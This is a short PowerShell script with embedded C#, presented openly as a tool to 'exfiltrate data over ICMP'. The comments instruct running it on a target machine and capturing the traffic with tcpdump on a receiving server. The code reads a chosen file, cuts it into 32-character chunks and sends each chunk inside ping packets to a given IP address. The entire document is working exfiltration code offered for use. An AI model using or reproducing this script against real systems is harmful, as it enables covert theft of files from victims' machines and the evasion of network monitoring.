# Exfiltrate data over ICMP
# -------------------------
# 1. Run this script on a target machine.
# 2. On the server (receiving host), assuming Unix, run the following:
#        tcpdump -i eth0 -n icmp and icmp[icmptype] != icmp-echoreply -X
#
param([Parameter(Position=0,mandatory=$true)][string]$ip, [Parameter(Position=1,mandatory=$true)][string]$file)

$source = @"
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;

public class PingExfil2
{
    public static void Ping_With_Data(string address, String data)
    {
        Ping pingSender = new Ping();
        PingOptions options = new PingOptions();

        // Use the default Ttl value which is 128,
        // but change the fragmentation behavior.
        options.DontFragment = true;

        // Create a buffer of 32 bytes of data to be transmitted.
        byte[] buffer = Encoding.ASCII.GetBytes (data);
        int timeout = 120;
        PingReply reply = pingSender.Send (address, timeout, buffer, options);
    }
}
"@
Add-Type -TypeDefinition $source

$content = Get-Content $file
$content_char = [char[]]$content

# Cut up the file into chunks of 32 characters each and send it over
# one by one (more than that won't fit into data portion of ICMP packet)
for ($j=0; $j -lt [int][Math]::Ceiling($content.Length/32); $j++)
{
    $data = ""
    for ($i=0; $i -lt 32; $i++)
    {
        $data += $content_char[($j*32) + $i]
    }
    [PingExfil2]::Ping_With_Data($ip, $data)
}